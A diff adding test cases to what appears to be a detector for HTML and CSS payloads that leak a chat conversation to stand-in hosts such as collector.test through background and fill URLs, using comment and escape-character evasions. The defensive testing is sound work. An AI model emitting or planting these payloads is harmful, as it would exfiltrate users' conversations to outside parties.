@@ -511,6 +511,22 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ('<div style="background:/**/url(https://collector.test/{c}.png)">x</div>', ["exfiltration_query"]),
         ('<svg><rect style="fill:url(https://collector.test/{c}.svg#p)"/></svg>', ["exfiltration_query"]),
         ('<div style="background:url(javascript:alert(1))">x</div>', ["script_uri"]),
+        (
+            "<div style='background:url(\"https://collector.test/a/*{conversation}*/b.png\")'>x</div>",
+            ["exfiltration_query"],
+        ),
+        (
+            "<style>.a{background:url('https://collector.test/a/*{conversation}*/b.png')}</style>",
+            ["exfiltration_query"],
+        ),
+        ('<div style="background:url(https://collector.test/a\\29?q={conversation})">x</div>', ["exfiltration_query"]),
+        ("<style>.a{background:url(https://collector.test/a\\29?q={conversation})}</style>", ["exfiltration_query"]),
+        (
+            '<textarea style="background:url(https://collector.test/{conversation}.png)">x</textarea>',
+            ["exfiltration_query"],
+        ),
+        ('<title style="background:url(https://collector.test/{c}.png)">x</title>', ["exfiltration_query"]),
+        ('<template><textarea style="background:url(https://collector.test/{c}.png)">x</textarea></template>', []),
         ('<div style="color:red;margin:0">x</div>', []),
         ("<style>.a{color:red;font-family:'Inter'}</style>", []),
         ("<template><style>.a{background:url(https://collector.test/{c}.png)}</style></template>", []),
